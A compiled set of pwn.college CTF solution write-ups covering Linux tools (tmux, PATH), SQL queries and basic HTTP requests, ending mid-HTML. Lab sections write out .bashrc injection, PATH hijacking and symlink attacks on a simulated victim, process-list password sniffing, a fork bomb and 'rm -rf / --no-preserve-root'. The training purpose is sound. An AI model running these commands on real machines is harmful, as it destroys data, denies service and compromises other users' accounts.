`if [ "$GUESS" == "hack the PLANET" ]`: This is the gatekeeper. The string is case-sensitive and must match exactly, including the space and the capitalization of "PLANET".

You can use `echo` to send the password directly into the script’s input stream:

```bash
echo "hack the PLANET" | /challenge/run
```

---

## 12: Terminal Multiplexing

**screen** The `screen` utility is a terminal multiplexer. It allows you to create multiple “virtual” windows within a single terminal session. This is particularly useful for running long processes in the background or managing multiple tasks without opening dozens of SSH connections.

- Each screen window behaves like a fresh terminal.
- One of `screen`’s greatest powers is that it can “detach.” If your internet connection drops, the programs running inside screen keep running on the server. You can “reattach” later and pick up exactly where you left off.
- Typing `exit` or hitting `Ctrl+D` closes the current virtual window. Once the last window is closed, the screen session ends.

Just enter `screen` to get it.

**Detaching and attaching**:

The primary advantage of screen is that the processes inside it are persistent. They are not tied to your current login session or terminal window.

- `Ctrl-a` then `d`: This detaches the session. The programs inside keep running, but you are returned to your original shell prompt.
- `screen -r`: This reattaches to a running session. It brings the background virtual terminal back to the foreground so you can see what happened while you were gone.
- `screen -ls`: A helpful bonus command that lists all currently running screen sessions if you ever have more than one.

Challenge steps:

```bash
screen
```

Press `Ctrl+a`, release, then press `d`. You should see a message like `[detached from …]`. You are now back in your “main” terminal.

```bash
/challenge/run
```

Reattach to claim it: `screen -r`

**Finding sessions**:

List sessions with `screen -ls` and attach to the first one with `screen -r [first_session_name]`.

If you don’t see the flag, press `Ctrl+a`, then `d` to return to your main terminal.

Try the next sessions: `screen -r [second_session_name]`

**Switching windows**:

These windows are handled with different keyboard shortcuts, all starting with `Ctrl-A`:

- `Ctrl-A c` - Create a new window
- `Ctrl-A n` - Next window
- `Ctrl-A p` - Previous window
- `Ctrl-A 0` through `Ctrl-A 9` - Jump directly to window 0-9
- `Ctrl-A "` - bring up a selection menu of all of the windows

Attach to the session with `screen -r`, then use one of the key combinations above to switch to Window 1. Go get that flag!

Switch windows: You will likely start in Window 1 (the welcome message). To find the flag in Window 0, use the shortcut to go to the previous window or jump directly:

Press `Ctrl-a`, then `p` (previous) OR `Ctrl-a` then `0`

**Detaching & attaching (tmux)**:

**tmux** `tmux` (Terminal Multiplexer) is the modern industry standard for managing multiple terminal sessions. While it performs the same core functions as screen, it is generally considered more stable and feature-rich.

- Prefix Key: By default, `tmux` uses `Ctrl-b` as the trigger for all commands (unlike screen's `Ctrl-a`).
- Detaching: Press `Ctrl-b`, then `d`.
- Listing: Use `tmux ls` to see active sessions.
- Reattaching: Use `tmux attach` (or the shorthand `tmux a`) to jump back into your session.

Launch the multiplexer with `tmux`, then detach from the session with `Ctrl-b` then `d`. You will return to your main shell. Then run the challenge command. Reattach with `tmux a` to claim it.

**Switching windows (tmux)**:

Just like screen, tmux has windows. The key combos are different, but the concept is the same:

- `Ctrl-B c` - Create a new window
- `Ctrl-B n` - Next window
- `Ctrl-B p` - Previous window
- `Ctrl-B 0` through `Ctrl-B 9` - Jump to window 0-9
- `Ctrl-B w` - See a nice window picker

Tmux shows your windows at the bottom in a status bar that looks like:

`[0] 0:bash* 1:bash`

The `*` shows your current window, and each entry also shows the process that the window was created to run.

Window 0 has the flag!
Window 1 has your warm welcome.

```bash
tmux a
Ctrl-b then 0
```

---

## 13: Pondering PATH

Thus far, you have invoked commands in several ways:

- Through an absolute path (e.g., `/challenge/run`).
- Through a relative path (e.g., `./run`).
- Through a bare command name (e.g., `ls`).

The first two cases, the absolute and the relative path case, are straightforward: the `run` file lives in the `/challenge` directory, and both cases refer to it (provided, of course, that the relative path is invoked with a current working directory of `/challenge`). But what about the last one? Where is the `ls` program located? How does the shell know to search for it there?

**The PATH Variable**:

`PATH` The `PATH` variable is one of the most critical environment variables in Linux. It contains a colon-separated list of directories (e.g., `/usr/bin:/bin`) that the shell searches, in order, whenever you type a command that isn't a direct path.

- How it works: When you type `rm`, the shell looks in the first directory in your `PATH`. If it's not there, it moves to the second, and so on. If it exhausts the list without finding the executable, it returns "command not found."
- The “Kill Switch”: By setting `PATH=""` (an empty string), you effectively blindfold the shell. It will no longer be able to find standard tools like `ls`, `cat`, or `rm` unless you provide their full absolute paths (like `/bin/rm`).

The `/challenge/run` program is scripted to call `rm flag`. Your goal is to make sure that when the script tries to run `rm`, the shell fails to find the program.

In your terminal, wipe out the search directories: `PATH=""`

Run the challenge program using its absolute path (since the shell can’t “find” it automatically anymore): `/challenge/run`

The program will attempt to run `rm`, fail because the PATH is empty, and — seeing that its attempt to delete the flag was thwarted — it will hand the flag over to you.

**Setting PATH**:

`PATH=[directory]` By reassigning the `PATH` variable, you tell the shell exactly where to look for commands. When you run a command by its "bare name" (like `win` instead of `/path/to/win`), the shell scans the directories listed in `PATH` from left to right.

- Overwriting vs. Appending: In this level, you are overwriting the path. This means the shell will only look in the new directory you provide. Standard commands like `ls` or `cat` will stop working unless you use their full paths (e.g., `/bin/ls`).
- Format: `PATH` is a list of absolute paths. If you had multiple directories, you would separate them with colons: `PATH=/dir1:/dir2`.

The `/challenge/run` program wants to execute a command called `win`. Currently, your shell doesn’t know where `win` lives. You need to point the `PATH` to the specific folder containing that command.

Set the new PATH: Point the shell to the directory where the `win` executable is located: `PATH=/challenge/more_commands/`

Now that the shell knows where to find `win`, launch the challenge using its absolute path: `/challenge/run`

**Finding commands**:

`which [command]` The `which` command is a diagnostic tool used to locate the exact executable file that the shell would run for a given command name. It does this by scanning every directory listed in your `$PATH` variable, in order, until it finds a match.

- It is perfect for resolving “Which version of Python am I running?” or “Where is this custom script actually located?”
- If there are two files named `win` in different directories in your `$PATH`, `which` will only show the one in the directory that appears first in the list.

In this level, the `win` command is a “breadcrumb.” The actual flag isn’t inside the command’s code, but in a file sitting right next to it in the same folder.

Find the absolute path to the `win` executable: `which win`

Since the flag is in the same directory as that file, you need to `cat` the flag using that same path. If `which win` gave you `/challenge/sub/folder/win`, your command would be: `cat /challenge/sub/folder/flag`

**Adding Commands**:

**PATH Injection (Hijacking)** This technique involves creating your own malicious or helper script with the same name as a command that a program is looking for. By placing your script in a directory and setting your `PATH` to that directory, you "trick" the system into running your code instead of the original command.

- Precedence: The shell searches `PATH` directories from left to right. If you place your directory at the very beginning, the shell finds your version of the command first.
- Absolute Paths vs. Built-ins: To avoid the “circular dependency” (where your script can’t find tools like `cat` because you broke the `PATH`), you should use absolute paths (e.g., `/bin/cat`) or shell built-ins (e.g., `read`) inside your script

You need to create a “fake” `win` command that reads the flag, and then make sure `/challenge/run` finds it:

```bash
echo "/bin/cat /flag" > ~/win
chmod +x ~/win
```

Point the PATH to your script: Tell the shell to look in your home directory for commands. Since the challenge says `win` is the only thing needed, overwriting is fine: `PATH=/home/hacker`

`/challenge/run`

**Hijacking commands**:

Instead of letting the real `rm` delete the flag, you are going to create a “fake” `rm`. When `/challenge/run` calls `rm`, it will accidentally execute your script, which will `cat` the flag for you.

Create your “fake” `rm` script: You need a script that reads the flag. Since we are going to overwrite the `PATH`, we should use the absolute path to `cat` (usually `/bin/cat`):

```bash
echo "/bin/cat /flag" > /home/hacker/rm
chmod +x /home/hacker/rm
```

Point the PATH variable to the directory where your fake `rm` lives. By putting `/home/hacker` first, the shell will find your version of `rm` before it ever looks in `/bin` or `/usr/bin`: `PATH=/home/hacker`

`/challenge/run`

---

## 14: Shenanigans

**.bashrc (The Persistence Hook)** The `.bashrc` file is a script that runs automatically every time a user opens a new interactive shell. Because it runs with the permissions of the user logging in, it is a primary target for maintaining persistence in a compromised system.

- Automation: Anything written in this file — from aliases to complex scripts — executes before the user even sees their first command prompt.
- Permissions: If you can edit someone else’s `.bashrc`, you can force them to run commands on your behalf the next time they “log in.”
- Persistence: Even if you lose your current access to a machine, a malicious line in `.bashrc` ensures your code runs again as soon as a user returns.

You are playing the role of an attacker who has found a “writeable” configuration file for a higher-privileged user (`zardus`). Since `zardus` can read the flag and you cannot, you will “delegate” the task to them.

Inject the payload: Append a command to the end of the victim’s `.bashrc`. You want `zardus` to read the flag and send it back to you. Since you likely can’t see their screen, sending the output to a file you both can access (like `/tmp/flag_stolen`) or simply printing it to the terminal works here:

```bash
echo "cat /flag" >> /home/zardus/.bashrc
```

Trigger the “Login”: Run the simulation script to make the victim log in. As soon as `zardus` starts their shell, their `.bashrc` will execute your `cat /flag` command:

`/challenge/victim`

**Sniffing input**:

In the previous level, you abused Zardus’s `~/.bashrc` to make him run commands for you.

This time, Zardus doesn’t keep the flag lying around in a readable file after he logs in. Instead he’ll run a command named `flag_checker`, manually typing the flag into it for verification.

Your mission is to use your continued write access to Zardus’s `.bashrc` to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the `flag_checker`?

Create a script in your home directory that looks and acts like the real `flag_checker`.

```bash
# Create the script
echo 'echo "Type the flag"' > /home/hacker/flag_checker
echo 'read FLAG' >> /home/hacker/flag_checker
echo 'echo "You entered: $FLAG"' >> /home/hacker/flag_checker

# Make it executable!
chmod +x /home/hacker/flag_checker
```

2. Inject the PATH Hijack

Now, tell Zardus’s shell to look in your home directory first whenever he tries to run a command.

```bash
echo 'export PATH=/home/hacker:$PATH' >> /home/zardus/.bashrc
```

Note: We append `:$PATH` to the end so that Zardus can still find other standard commands, but he will find your `flag_checker` before the real one.

3. Run the Victim Simulation

Execute the script that simulates Zardus logging in and checking the flag:

`/challenge/victim`

**Overshared Directories**:

This challenge exploits a Linux permission fundamental: if you have write access to a directory, you can delete and replace the files inside it, even if you don’t own those files. You will use this to replace Zardus’s `.bashrc` with your own malicious version to steal the flag.

1. Create your malicious `.bashrc` locally: Create a file in your home directory that mimics the previous attack. It should hijack the `flag_checker` command.

```bash
echo 'echo "Type the flag"' > /home/hacker/.bashrc
echo 'read FLAG' >> /home/hacker/.bashrc
echo 'echo "Captured: $FLAG"' >> /home/hacker/.bashrc
```

2. Replace the victim’s `.bashrc`: Since `/home/zardus` is world-writable, you can remove his original file and move yours in its place.

```bash
rm /home/zardus/.bashrc
cp /home/hacker/.bashrc /home/zardus/.bashrc
```

3. Trigger the capture: Run the victim simulation script. When Zardus “logs in,” his shell will execute your replaced `.bashrc`.

`/challenge/victim`

**Tricky linking**:

`ln -sf [Target] [Link_Name]` This attack uses a Symbolic Link (Symlink) to redirect a file write. By replacing a file that a victim is about to write to with a link to a different file, you “trick” the victim’s process into writing its data into your target file instead.

- The “Write” Vulnerability: If you have write access to a directory, you can delete a file and replace it with a symlink.
- Permissions Bypass: When the victim (Zardus) appends to the symlink, the Linux kernel follows the link and performs the write on the target file using the victim’s higher privileges.

The goal is to get the command `cat /flag` written into Zardus’s `.bashrc` so that it executes the next time he logs in.

Replace the file with a Symlink: Delete the existing text file and create a link that points to Zardus’s startup script.

```bash
rm /tmp/collab/evil-commands.txt
ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
```

First Run (The Injection): Run the victim script. Zardus will log in and run `echo "cat /flag" >> /tmp/collab/evil-commands.txt`. Because of your link, that command is actually appended to `/home/zardus/.bashrc`.

`/challenge/victim`

Second Run (The Execution): Run the victim script again. This time, when Zardus logs in, his shell reads his `.bashrc`, sees the `cat /flag` command you injected, and executes it.

`/challenge/victim`

**Sniffing process arguments**:

`ps aux` (Process Observation) In Linux, the process list is generally public. Any user can see which commands other users are running, along with the arguments passed to those commands.

- The Vulnerability: If a user runs a command like `mysql -u root -pPassword123`, that password is visible to anyone running `ps` at that exact moment.
- Timing: To catch this, you often have to be “listening” or refreshing the process list while the victim’s command is executing.

You need to catch Zardus in the act of passing his password to a script. Since you don’t know exactly when he’ll do it, you can use a simple loop or just keep a close eye on the process list.

Monitor the Processes: Open one terminal and run `ps aux` repeatedly, or use the `watch` command to refresh it every second:

```bash
while true; do ps aux | grep zardus | grep -v grep; sleep 0.1; done
```

Keep your eyes on the output. You are looking for a line that looks like this: `zardus [PID] ... python3 /path/to/script.py --password [SECRET_PASSWORD]`

Pivot to `zardus` with: `su zardus`

`sudo cat /flag`

**Snooping on configurations**:

World-Readable Files By default, many configuration files in a Linux home directory are created with permissions like `-rw-r--r--` (644). The last `r` means anyone on the system can read the file, even if they aren't the owner.

- Environment Variables: Users often store secrets like `API_KEYS`, `DB_PASSWORDS`, or `TOKENS` in their `.bashrc` or `.profile` so they are always available in their shell.
- The Risk: If you can navigate to another user’s home directory (and the directory itself has execute permissions), you can `cat` their configuration files to harvest these secrets.

Zardus has hidden his API key in his startup script. Since you don’t need to be Zardus to read a world-readable file, you can just grab it directly.

Read victim’s bashes: `cat /home/zardus/.bashrc`

Look for a line that looks like `FLAG_GETTER_API_KEY=…` and copy the value after the equals sign.

Run the flag-getting utility using the key you just found:

Key was, `FLAG_GETTER_API_KEY=sk-1965714851`, so:

```bash
flag_getter --key sk-1965714851
```

---

## 15: Daring Destruction

**Fork Bomb**:

A Fork Bomb is a form of Denial of Service (DoS) attack where a process continually replicates itself to deplete available system resources (specifically the process table).

- `fork()`: The system call used to create a new process.
- Backgrounding (`&`): Essential for a fork bomb; without it, the script would wait for the first "child" to finish before starting the next, resulting in a linear chain rather than an exponential explosion.
- Exponential Growth: If one script launches two copies, and those each launch two, the number of processes grows as $2^n$.

You need to create a script that calls itself twice in the background and then exits (or stays alive to keep the process table full).

1. Open a second terminal or window. Run the checker first, as you won’t be able to open a new terminal once the bomb starts:

`/challenge/check`

2. Create the bomb script. In your first terminal, create a script (let’s call it `bomb.sh`):

```bash
echo '#!/bin/bash' > bomb.sh
echo './bomb.sh & ./bomb.sh &' >> bomb.sh
```

3. Make it executable:

`chmod +x bomb.sh`

4. Detonate. Launch the script:

`./bomb.sh`

**Disk-Space Doomsday**:

The `yes` Command The `yes` command outputs a string (default is ‘y’) repeatedly until killed. While usually used to automate interactive prompts (e.g., `yes | rm -i *`), it can also be used as a high-speed data generator for testing disk limits.

Disk Quotas and Space In shared or containerized environments, users are often restricted by a Quota. Once you hit this limit, the system cannot write new data to the disk, which causes many programs (like editors or even simple shells) to crash or fail.

**How to Solve It**: This challenge is a two-act play: first you break the system, then you fix it.

Stage 1: Inducing Disk Exhaustion
You need to create a file so large it consumes the remaining space of your 1GB quota.

Start the “Clog”: Redirect the infinite output of `yes` into a file. You won’t see any output, and the command will seem to “hang” — this is good!

`yes > big_junk_file`

Wait for the failure: Let it run for about 30–60 seconds. Eventually, you should see an error: `bash: write error: No space left on device` (Once you see this error, the file has officially filled your quota.)

Run the first check:

`/challenge/check`

The checker will verify it can’t create a 1MB file and will then tell you to clean up.

Stage 2: The Cleanup
Now you must restore the environment to a working state.

Remove the junk:

`rm big_junk_file`

Run the second check:

`/challenge/check`

The checker will now successfully create its file and reward you with the flag.

**rm -rf /**:

`rm -rf /` This is the nuclear option for a Linux filesystem.

- `rm`: The remove command.
- `-r`: Recursive (dives into every folder and subfolder).
- `-f`: Force (tells the system "don't ask me for permission, don't stop for errors, just kill it").
- `/`: The root directory (the very top of the hierarchy).

The `--no-preserve-root` Safeguard: Most modern versions of `rm` include a safety lock. If you try to run `rm -rf /`, the system will stop you and say it's too dangerous unless you explicitly add the flag `--no-preserve-root`.

Life after `rm -rf /`: When you run `rm -rf /`, you are deleting the files stored on the disk, including the programs located in `/bin`. However, bash is already loaded into your computer's RAM. Even if the bash file on the disk is deleted, the version currently running in your memory still has all its "built-in" powers.

In a separate terminal or tmux pane:

`/challenge/check`

2. The Nuclear Option
In your main terminal, wipe the system:

`rm -rf / --no-preserve-root`

Wait for the errors to stop. At this point, if you try to type `ls` or `cat`, the shell will tell you “command not found” because those files are gone.

3. The “Builtin” Extraction
The checker should now signal that it has restored `/flag`. Since `cat` is dead, use `read`:

```bash
# Read the first line of the flag file into a variable named ‘FLAG’
read -r FLAG < /flag

# Print the variable to your screen
echo $FLAG
```

# Module 2: SQL Queries

## 1. Basic SQL Queries
### Link: https://medium.com/@www.aayushaayun/sql-playground-playing-with-programs-2ab6c67e99f7

We need to use "SELECT" query in this challenge. The challenge says to read the code properly to get the flag.

We can see that a table named "assets" is being created in which the content of "/flag" is being stored. So, in order to get the flag we can use the following command after running the file.

```sql
SELECT * FROM assets;
```

---

## 2. Filtering SQL

This challenge requires us to focus on "WHERE" query. If we read the code then we can see the name of table "details" with two columns: `flag_tag` (value 1) and `secret` (a random word).

So, in order to get the flag we need to search the "details" table where `flag_tag` is 1337.

```sql
SELECT secret FROM details WHERE flag_tag = 1337;
```

---

## 3. Choosing Columns

This challenge is essentially the same as before, but with a minor semantic change: the column name has been changed from `secret` to `info`.

So, in order to get the flag we can simply change "secret" to "info" from the previous challenge code.

```sql
SELECT info FROM details WHERE flag_tag = 1337;
```

---

## 4. Exclusionary Filtering

```sql
SELECT flag FROM flags WHERE flag_tag != 1;
```

---

## 5. Filtering Strings

Creates a table `data` with two columns:

- `flag_tag`: constant 'nope'
- `secret`: a random word of the same length as the flag

Inserts 5–41 fake rows with 'nope' as tag, and random secrets.
Inserts one real row:
- `flag_tag` = "yep"
- `secret` = flag
Inserts 5–41 more fake rows after the flag.

```sql
SELECT secret FROM data WHERE flag_tag = 'yep';
```

---

## 6. Filtering On Expression

```sql
SELECT * FROM fragments WHERE SUBSTR(record, 1, 1) = 'p';
```

---

## 7. Selecting Expressions

To extract the flag character by character from the `archive` table:

```sql
SELECT SUBSTR(value, 1, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 5, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 9, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 13, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 17, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 21, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 25, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 29, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 33, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 37, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 41, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 45, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 49, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 53, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 57, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
```

---

## 8. Composite Conditions

```sql
SELECT text FROM storage WHERE flag_tag = 1337 LIMIT 1;
```

---

## 9. Reaching Your Limits

```sql
SELECT blob FROM payloads WHERE SUBSTR(blob, 1, 3) = "pwn" LIMIT 1;
```

---

## 10. Querying Metadata

First, find the table name:

```sql
SELECT tbl_name FROM sqlite_master;
```

Then, query the discovered table (replace `usMSjFGn` with the actual table name found):

```sql
SELECT detail FROM usMSjFGn;
```

# Module 3: Talking Web
### Link: https://medium.com/@souravbose361/pwncollege-talking-web-38c68dd8549f

## Challenge Information
Obviously, as you're accessing this website in your web browser, this isn't your *first* HTTP request. But it's your first HTTP request for a pwn.college challenge! Run `/challenge/server`, fire up Firefox in the dojo workspace (you'll need to use the [GUI Desktop](https://pwn.college/workspace/desktop) for this!), and visit the URL that it's listening on for the flag!

---

## 1. Your First HTTP Request

I executed the program which is located in `/challenge` directory. The filename is `server`. Upon running the script the URL will be revealed as shown below. The script will only reveal the flag if the requests' User Agent is Firefox. So, I used `curl` to send the request.

```bash
curl --user-agent "Firefox" http://challenge.localhost:80/pwn
```

---

## 2. Reading Flask

Analyzing the program and the URL `http://challenge.localhost:80` I understood that the endpoint for triggering the `def challenge()` function is `/pwn` and also the user-agent has to be Firefox. So, I used `curl` command to do the following.

```bash
curl --user-agent "Firefox" http://challenge.localhost:80/pwn
```

---

## 3. Commented Data

Well, this challenge is just the same as the last one except the flag will be hidden as comment in the HTML source code but lucky for us `curl` produces the HTML source code as response so we can just use the same previous technique to solve this challenge.

```bash
curl --user-agent "Firefox" http://challenge.localhost:80/pwn
```

---

## 4. HTTP Metadata

We will use `curl` command along with the `-v` option to check the request and response. The `-v` is for verbosity.

```bash
curl -v http://challenge.localhost:80/pwn
```

---

## 5. HTTP (netcat)

In this challenge, we need to send HTTP GET request to the URL `http://challenge.localhost:80` at endpoint `/` to get the flag. We have to use `netcat` to connect to the target web server and send our request.

```bash
echo -ne "GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc challenge.localhost 80
```

---

## 6. HTTP Paths (netcat)

This challenge is just like the previous one with just a different endpoint. The endpoint is `/hack` this time.

```bash
echo -ne "GET /hack HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc challenge.localhost 80
```

---

## 7. HTTP (curl)

Using `curl` to make HTTP requests to the endpoint `/trial` in the URL `http://challenge.localhost:80`.

```bash
curl http://challenge.localhost:80/trial
```

---

## 8. HTTP (python)

We need to send HTTP GET request to the target URL using Python’s `requests` library.

```python
import requests
r = requests.get('http://challenge.localhost:80/trial')
print(r.text)
```

---

## 9. HTTP Host Header (python)

We need to send HTTP get request to the target URL by changing the host header using python `requests` library. The host header name will be provided inside the server script.

```python
import requests
headers = {'Host': 'challenge.localhost'}
r = requests.get('http://challenge.localhost', headers=headers)
print(r.text)
```

---

## 10. HTTP Host Header (curl)

Same as the previous challenge except we need to use `curl` this time.

```bash
curl --header "Host: challenge.localhost" http://challenge.localhost
```

---

## 11. HTTP Host Header (netcat)

Same as the previous challenge except we need to use `netcat` this time. Remember that `netcat` alone will not be sufficient to solve this challenge so you can use `echo` command along with it as well, like I have shown below in the image.

```bash
echo -ne "GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc challenge.localhost 80
```

---

## 12. URL Encoding (netcat)

We need to use `netcat` to send HTTP GET request to a URL with the mentioned Host header and also the endpoint for the URL has spaces so we need to provided the correct encoded value of spaces as well.

```bash
echo -ne "GET /hack%20the%20planet HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc challenge.localhost 80
```

---

## 13. HTTP GET Parameters

We need to pass a Query String in our HTTP GET request to get the challenge flag.

```bash
curl "http://challenge.localhost:80/endpoint?key=value"
```

---

## 14. Multiple HTTP Parameters (netcat)

We need to again pass Query String in our HTTP GET request but this time there will be multiple query strings so we can append them using `&` symbol. We will use `netcat` for this challenge.

```bash
echo -ne "GET /path?param1=value1&param2=value2 HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc challenge.localhost 80
```

---

## 15. Multiple HTTP Parameters (curl)

We need to pass multiple query string just like the previous challenge using `curl` this time. The shell might interpret the `&` symbol for something else so its better to keep the target URL within quotes.

```bash
curl "http://challenge.localhost:80/path?param1=value1&param2=value2"
```

---

## 16. HTTP Forms

We need to send POST request to the server. I am going to use `curl` because its much faster than using the web browser for this challenge. To send POST request using `curl` we use the `-X POST` and since there is a parameter which we need to pass along with the POST request therefore we need to use `-d` option as well.

```bash
curl -X POST -d "parameter=value" http://challenge.localhost:80/endpoint
```

---

## 17. HTTP Forms (curl)

This challenge is actually asking us to solve it via `curl` which I have shown previously. So, its just like the previous one.

```bash
curl -X POST -d "parameter=value" http://challenge.localhost:80/endpoint
```

---

## 18. HTTP Forms (netcat)

This one is a bit tricky and honestly a bit frustrating for me. I kept messing up the URL so its better you refer to the link -> Mozilla before forming your POST request URL. This challenge is same as the previous one except for this time we are using `netcat`.

**Remember the following things :**
- Mention the Content Length
- Mention the Content Type

I mentioned the above 2 points because you might ignore mentioning them and keep wasting your time trying your URL.

```bash
echo -ne "POST /endpoint HTTP/1.1\r\nHost: challenge.localhost:80\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\n\r\nparameter=value" | nc challenge.localhost 80
```

---

## 19. HTTP Forms (python)

We need to send POST request to the target server using Python’s `requests` library. Below is the program how to do this.

```python
import requests
data = {'parameter': 'value'}
r = requests.post('http://challenge.localhost:80/endpoint', data=data)
print(r.text)
```

---

## 20. HTTP Forms Without Forms

Sending POST request using `curl` as shown below.

```bash
curl -X POST -d "parameter=value" http://challenge.localhost:80/endpoint
```

---

## 21. HTTP Forms Without Forms (curl)

Same thing as the previous challenge.

```bash
curl -X POST -d "parameter=value" http://challenge.localhost:80/endpoint
```

---

## 22. HTTP Forms Without Forms (netcat)

Same thing as the previous challenge. This time using `netcat`.

```bash
echo -ne "POST /endpoint HTTP/1.1\r\nHost: challenge.localhost:80\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\n\r\nparameter=value" | nc challenge.localhost 80
```

---

## 23. HTTP Redirects (netcat)

We need to make a GET request first and using the `-v` option with `netcat` will show us the response and we will then get the redirect actual endpoint as shown below.

```bash
echo -ne 'GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n' | nc challenge.localhost 80 -v
```

**Response:**
```
HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.6 Python/3.8.10
Date: Thu, 23 Oct 2025 14:54:45 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 221
Location: /wbcYrxAh-fulfill
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/wbcYrxAh-fulfill">/wbcYrxAh-fulfill</a>. If not, click the link.
```

Now making GET request to the actual endpoint using `netcat` and getting the flag.

```bash
echo -ne "GET /wbcYrxAh-fulfill HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc challenge.localhost 80
```

---

## 24. HTTP Redirects (curl)

Doing redirects using `curl` is easier because `curl` has `-L` option which enables us to follow the redirection link. You can also enable the `-v` option to get the response and request info for better clarification.

```bash
curl -L http://challenge.localhost:80
```

---

## 25. HTTP Redirects (python)

Using Python’s `requests` library to solve this challenge. Python’s `requests` library will automatically follow up the redirection.

```python
import requests
r = requests.get('http://challenge.localhost:80')
print(r.text)
```

---

## 26. HTTP Cookies (curl)

```bash
./run
```

**Output:**
```
Make an HTTP request to 127.0.0.1 on port 80 to get the flag. Make any HTTP request, and the server will ask you to set a cookie. Make another request with that cookie to get the flag.
You must make this request using the curl command

The following output is from the server, might be useful in helping you debug:

 * Serving Flask app 'run'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:80
Press CTRL+C to quit
```

I executed the script `run` and it clearly states that first we need to make a HTTP request at the target URL `http://127.0.0.1` on port 80 which will give us a cookie and we need to use `curl` to set-cookie in our HTTP header so that we get the flag.

```bash
curl http://localhost:80 -v
```

We are basically making a HTTP GET request at the target URL and the `-v` option gives us the Response details from the server where we will find our Cookie. After that we need to use that cookie to get our flag as shown below.

```bash
curl --cookie "cookie_name=cookie_value" http://localhost:80
```

---

## 27. HTTP Cookies (netcat)

Same as the previous challenge but this time using `netcat`. So first we need to send our HTTP GET request to get our cookie value as shown below.

```bash
echo -ne 'GET / HTTP/1.1\r\nHost: localhost:80\r\n\r\n' | nc 127.0.0.1 80
```

After getting the cookie value add it as a header in the HTTP GET request just like last time to get the flag.

```bash
echo -ne "GET / HTTP/1.1\r\nHost: localhost:80\r\nCookie: cookie_name=cookie_value\r\n\r\n" | nc 127.0.0.1 80
```

---

## 28. HTTP Cookies (python)

Same as the previous challenge but this time using Python’s `requests` library.

```python
import requests
url='http://127.0.0.1:80'
r=requests.get(url)
print(r.text)
```

I think there is some problem with the challenge because I only made a HTTP GET request using a simple python program and it generated the flag, I didn’t need to set the cookie value.

---

## 29. Server State (python)

Wrote a basic python script to get the flag just like the last time.

```python
import requests
url='http://127.0.0.1:80'
r=requests.get(url)
print(r.text)
```

---

## 30. Listening Web

I am going to be using `netcat` to solve this challenge. We will use `netcat` to listen for incoming requests from the URL `http://localhost` on port 1337.

```bash
nc -l -p 1337 -v
```

The `netcat` will listen for incoming requests on that particular port and when you run the challenge script you will get the flag.

---

## 31. Speaking Redirects

We first need to start our server program which will listen at `http://challenge.localhost:80/attempt` and we need our redirection program to redirect the client program from `http://localhost:1337` to the server program endpoint. If we are able to perform this redirection then the client program will produce the flag.

### Redirect Program (redirect.py)
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 1337))
s.listen(5)
print("Listening on port 1337...")
while True:
    conn, addr = s.accept()
    request = conn.recv(1024)
    print("Received request:", request.decode())
    response = (
        "HTTP/1.1 302 Found\r\n"
        "Location: http://challenge.localhost:80/attempt\r\n"
        "Content-Length: 0\r\n"
        "\r\n\r\n"
    )
    conn.sendall(response.encode())
    conn.close()
```

Start the server program and then the redirect program and after that start the client program to get the flag. **KEEP 3 TABS OPEN FOR PROPER RESULTS**. After all of this is done checkout the tab where you started the client program only if server program returns 200 status code.

---

## 32. JavaScript Redirects

Read the instructions carefully mentioned in the challenge. It states you need to create an HTML file at this location `/home/hacker/public_html/solve.html`. The name provided should be the same as well. Our target is to redirect the client program to the `http://challenge.localhost:80/fulfill` endpoint or basically to the location of the server program.

We need to write the JavaScript code to cause this redirection.

### solve.html
```html
<html>
 <head>
  <title>Redirection</title>
 </head>
 <body>
  <p>Redirection using Javascript!!!</p>
 </body>
 <script>
  window.location.href='http://challenge.localhost:80/fulfill';
 </script>
</html>
```

---

## 33. Including JavaScript

This challenge is a bit trickier than the previous one. We first need to include the external script located at `http://challenge.localhost:80/solve` endpoint into our `solve.html` file and at same location like last time. After loading this script we can access the `flag` variable. We then use the `window.location` object of JavaScript to add this flag into our URL where we can redirect the browser and it will print the flag at that location.

### solve.html
```html
<html>
 <head>
  <title>Redirection</title>
 </head>
 <body>
